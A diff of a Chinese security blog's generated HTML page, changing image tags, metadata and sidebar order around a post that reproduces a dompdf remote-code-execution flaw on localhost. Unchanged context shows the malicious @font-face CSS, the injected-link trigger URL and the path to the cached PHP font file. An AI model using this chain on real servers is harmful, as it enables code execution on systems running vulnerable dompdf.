@@ -27,11 +27,15 @@
 <meta property="og:site_name" content="郁涛丶&#39;s Blog">
 <meta property="og:description" content="这次的漏洞是dompdf这样一个php的库，dompdf库用于将html呈现为pdf，还是比较新的。 最开始这个漏洞并不是rce，而是xss。 首先是两个配置： 在 PDF 渲染期间执行嵌入式 PHP，之后的被禁用了。 1234567891011121314151617181920&#x2F;*** Enable embedded PHP** If this setting is set to true t">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2022/03/19/dompdf%200day(RCE)%E5%A4%8D%E7%8E%B0/image-20220319111650926.png">
+<meta property="og:image" content="http://example.com/2022/03/19/dompdf%200day(RCE)%E5%A4%8D%E7%8E%B0/image-20220319111921628.png">
+<meta property="og:image" content="http://example.com/2022/03/19/dompdf%200day(RCE)%E5%A4%8D%E7%8E%B0/image-20220319112233859.png">
 <meta property="article:published_time" content="2022-03-18T16:00:00.000Z">
-<meta property="article:modified_time" content="2022-03-19T03:24:24.447Z">
+<meta property="article:modified_time" content="2022-03-19T03:29:49.855Z">
 <meta property="article:author" content="郁涛丶">
 <meta property="article:tag" content="漏洞复现">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/03/19/dompdf%200day(RCE)%E5%A4%8D%E7%8E%B0/image-20220319111650926.png">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
     <link rel="icon" href="/assets/favicon.ico">
@@ -521,16 +525,16 @@
 <p>下面是构造的<code>css</code>以及<code>ttf(php)</code>：</p>
 <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@font-face</span> &#123;</span><br><span class="line">    <span class="attribute">font-family</span>:<span class="string">&#x27;exploitfont&#x27;</span>;</span><br><span class="line">    <span class="attribute">src</span>:<span class="built_in">url</span>(<span class="string">&#x27;http://localhost:9001/exploit_font.php&#x27;</span>);</span><br><span class="line">    <span class="attribute">font-weight</span>:<span class="string">&#x27;normal&#x27;</span>;</span><br><span class="line">    <span class="attribute">font-style</span>:<span class="string">&#x27;normal&#x27;</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
 
-<p>![image-20220319111650926](dompdf 0day(RCE)复现/image-20220319111650926.png)</p>
+<p><img src="/2022/03/19/dompdf%200day(RCE)%E5%A4%8D%E7%8E%B0/image-20220319111650926.png" alt="image-20220319111650926"></p>
 <p>至于ttf文件结构？网上一堆。。。</p>
 <p>下面直接使用<a target="_blank" rel="noopener" href="https://github.com/positive-security/dompdf-rce">github</a>的来复现：</p>
 <p>开启应用和exp：</p>
-<p>![image-20220319111921628](dompdf 0day(RCE)复现/image-20220319111921628.png)</p>
+<p><img src="/2022/03/19/dompdf%200day(RCE)%E5%A4%8D%E7%8E%B0/image-20220319111921628.png" alt="image-20220319111921628"></p>
 <p>使用exploit_font.php触发：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:9000/index.php?pdf&amp;title=&lt;link rel=stylesheet href=&#x27;http://localhost:9001/exploit.css&#x27;&gt;</span><br></pre></td></tr></table></figure>
 
 <p>之后访问：<code>http://localhost:9000/dompdf/lib/fonts/exploitfont_normal_3f83639933428d70e74a061f39009622.php</code></p>
-<p>![image-20220319112233859](dompdf 0day(RCE)复现/image-20220319112233859.png)</p>
+<p><img src="/2022/03/19/dompdf%200day(RCE)%E5%A4%8D%E7%8E%B0/image-20220319112233859.png" alt="image-20220319112233859"></p>
 <p>成功触发。</p>
 <p>u1s1这个洞完全可以出个CTF题，，</p>
 <p>参考链接：</p>
@@ -1058,368 +1062,6 @@
         
         
         
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
     
     
     
@@ -1804,6 +1446,21 @@
                 WEB
             </span>
         
+            <span class="sidebar-tag-name" data-tags="VulnHub">
+                <span class="iconfont-archer">&#xe606;</span>
+                VulnHub
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="渗透">
+                <span class="iconfont-archer">&#xe606;</span>
+                渗透
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="漏洞复现">
+                <span class="iconfont-archer">&#xe606;</span>
+                漏洞复现
+            </span>
+        
             <span class="sidebar-tag-name" data-tags="Python">
                 <span class="iconfont-archer">&#xe606;</span>
                 Python
@@ -1819,34 +1476,19 @@
                 内网
             </span>
         
-            <span class="sidebar-tag-name" data-tags="OS">
-                <span class="iconfont-archer">&#xe606;</span>
-                OS
-            </span>
-        
             <span class="sidebar-tag-name" data-tags="汇编">
                 <span class="iconfont-archer">&#xe606;</span>
                 汇编
             </span>
         
+            <span class="sidebar-tag-name" data-tags="OS">
+                <span class="iconfont-archer">&#xe606;</span>
+                OS
+            </span>
+        
             <span class="sidebar-tag-name" data-tags="WriteUp">
                 <span class="iconfont-archer">&#xe606;</span>
                 WriteUp
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="VulnHub">
-                <span class="iconfont-archer">&#xe606;</span>
-                VulnHub
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="渗透">
-                <span class="iconfont-archer">&#xe606;</span>
-                渗透
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="漏洞复现">
-                <span class="iconfont-archer">&#xe606;</span>
-                漏洞复现
             </span>
         
     </div>
